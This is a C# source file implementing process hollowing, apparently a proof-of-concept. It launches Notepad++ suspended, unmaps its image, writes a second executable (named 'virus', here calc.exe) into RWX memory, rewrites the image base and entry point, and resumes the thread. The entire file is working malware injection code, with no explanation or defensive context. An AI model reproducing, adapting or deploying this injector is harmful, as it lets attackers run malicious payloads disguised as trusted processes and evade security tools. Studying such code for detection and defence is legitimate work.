using ProcessInjector;
using System;
using System.IO;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
        private static IntPtr Allocate(int size, int alignment)
        {
            IntPtr allocated = Marshal.AllocHGlobal(size + (alignment / 2));
            return Align(allocated, alignment);
        }
        private static IntPtr Align(IntPtr source, int alignment)
        {
            long source64 = source.ToInt64() + (alignment - 1);
            long aligned = alignment * (source64 / alignment);
            return new IntPtr(aligned);
        }


        static void Main(string[] args)
        {
            //Paths to our files
            string notepadPath = @"D:\Program Files\Notepad++\notepad++.exe";
            string virusPath = @"C:\Windows\System32\calc.exe";

            byte[] victimFileBytes = File.ReadAllBytes(notepadPath);
            IntPtr victimFilePointer = Marshal.UnsafeAddrOfPinnedArrayElement(victimFileBytes, 0);


            byte[] virusFileBytes = File.ReadAllBytes(virusPath);
            IntPtr virusFilePointer = Marshal.UnsafeAddrOfPinnedArrayElement(virusFileBytes, 0);



            #region Create Victim Process in Suspended State 
            PInvoke.STARTUPINFO startupInfo = new PInvoke.STARTUPINFO();
            PInvoke.PROCESS_INFORMATION processInformation = new PInvoke.PROCESS_INFORMATION();

            bool couldNotCreateProcess = !PInvoke.CreateProcess(
                                                lpApplicationName: null,
                                                lpCommandLine: notepadPath,
                                                lpProcessAttributes: IntPtr.Zero,
                                                lpThreadAttributes: IntPtr.Zero,
                                                bInheritHandles: false,
                                                dwCreationFlags: PInvoke.CreationFlags.SUSPENDED,
                                                lpEnvironment: IntPtr.Zero,
                                                lpCurrentDirectory: null,
                                                ref startupInfo,
                                                ref processInformation
                                            );
            if (couldNotCreateProcess)
            {
                Console.WriteLine("Failed to create victim process...");

            }

            Console.WriteLine($"Successfully created victim process...");

            #endregion



            #region Getting ThreadContext

            //I need  threadHandle and threadContext
            IntPtr victimThreadHandle = processInformation.hThread;
            IntPtr pVictimThreadContext = PrepareThreadContextPointer();
            PInvoke.GetThreadContext(victimThreadHandle, pVictimThreadContext);
            PInvoke.CONTEXT64 victimThreadContext = Marshal.PtrToStructure<PInvoke.CONTEXT64>(pVictimThreadContext);

            #endregion

            #region Get Victim Image Base

            ulong rdx = victimThreadContext.Rdx;
            ulong victimImageBaseAddress = rdx + 16;
            IntPtr victimProcessHandle = processInformation.hProcess;
            IntPtr victimImageBase = Marshal.AllocHGlobal(8);
            PInvoke.ReadProcessMemory(victimProcessHandle, victimImageBaseAddress, victimImageBase, 8, out _);

            #endregion
            #region Unmap old data
            if (PInvoke.ZwUnmapViewOfSection(victimProcessHandle, victimImageBase) == PInvoke.NTSTATUS.STATUS_ACCESS_DENIED)
            {
                Console.WriteLine("Failed to unmap section...");
                return;
            }
            #endregion

            #region Allocate Space for virus image
            int virusElfanew = Marshal.ReadInt32(virusFilePointer, PInvoke.Offsets.E_LFANEW);
            long virusImageBase = Marshal.ReadInt64(virusFilePointer, virusElfanew + 0x30);
            uint sizeOfVirusImage = (uint)Marshal.ReadInt32(virusFilePointer, virusElfanew + 0x50);
            IntPtr allocatedNewRegionForVirus =  PInvoke.VirtualAllocEx(victimProcessHandle, (IntPtr)virusImageBase, sizeOfVirusImage, PInvoke.AllocationType.Reserve | PInvoke.AllocationType.Commit, PInvoke.MemoryProtection.ExecuteReadWrite);

            #endregion

            #region Write new headers
            uint sizeOfVirusHeaders = (uint)Marshal.ReadInt32(virusFilePointer, virusElfanew + 0x54);
            if (!PInvoke.WriteProcessMemory(victimProcessHandle, allocatedNewRegionForVirus, virusFilePointer, sizeOfVirusHeaders, out _))
            {
                Console.WriteLine("Writing headers failed...");
                return;
            };
            #endregion

            #region Write Sections and relocate if necessary

            int numberOfSections = Marshal.ReadInt16(virusFilePointer, virusElfanew + 0x6);
            int sizeOfOptionalHeader = Marshal.ReadInt16(virusFilePointer + virusElfanew + 0x10 + 0x04);
            int sizeOfImageSectionHeader = Marshal.SizeOf<PInvoke.IMAGE_SECTION_HEADER>();
            for (int i = 0; i < numberOfSections; i++)
            {
                IntPtr sectionHeaderPointer = virusFilePointer + virusElfanew + 0x18 + sizeOfOptionalHeader + (i * sizeOfImageSectionHeader);
                PInvoke.IMAGE_SECTION_HEADER sectionHeader = Marshal.PtrToStructure<PInvoke.IMAGE_SECTION_HEADER>(sectionHeaderPointer);

                uint virtualAddress = sectionHeader.VirtualAddress;
                uint sizeOfRawData = sectionHeader.SizeOfRawData;
                uint pointerToRawData = sectionHeader.PointerToRawData;

                byte[] bRawData = new byte[sizeOfRawData];
                Buffer.BlockCopy(virusFileBytes, (int)pointerToRawData, bRawData, 0, bRawData.Length);

                PInvoke.WriteProcessMemory(victimProcessHandle, (IntPtr)(virusImageBase + virtualAddress), Marshal.UnsafeAddrOfPinnedArrayElement(bRawData, 0), (uint)bRawData.Length, out _);

            }
            #endregion
            long rdxx = Marshal.ReadInt64(pVictimThreadContext, 0x88);
            byte[] bImageBase = BitConverter.GetBytes((long)virusImageBase);
            #region Rewrite Victim ImageBase to Virus ImageBase
            if (!PInvoke.WriteProcessMemory(victimProcessHandle, (IntPtr)victimImageBaseAddress, bImageBase, 0x8, out _))
            {
                Console.WriteLine("Rewriting image base failed...");
                return;
            }
            #endregion

            #region Rewrite Victim EntryPoint to Virus EntryPoint
            int virusEntryPointRVA = Marshal.ReadInt32(virusFilePointer, virusElfanew + 0x28);
            victimThreadContext.Rcx = (ulong)allocatedNewRegionForVirus +  (ulong)virusEntryPointRVA;
            Marshal.StructureToPtr(victimThreadContext, pVictimThreadContext, true);

            PInvoke.SetThreadContext(victimThreadHandle, pVictimThreadContext);
            #endregion

            PInvoke.ResumeThread(victimThreadHandle);
        }

        private static IntPtr PrepareThreadContextPointer()
        {
            IntPtr pThreadContext = Allocate(Marshal.SizeOf<PInvoke.CONTEXT64>(), 16);
            
            PInvoke.CONTEXT64 threadContext = new PInvoke.CONTEXT64() { ContextFlags = PInvoke.CONTEXT_FLAGS.CONTEXT_ALL };
            
            Marshal.StructureToPtr<PInvoke.CONTEXT64>(threadContext, pThreadContext, false);

            return pThreadContext;
        }
    }
}
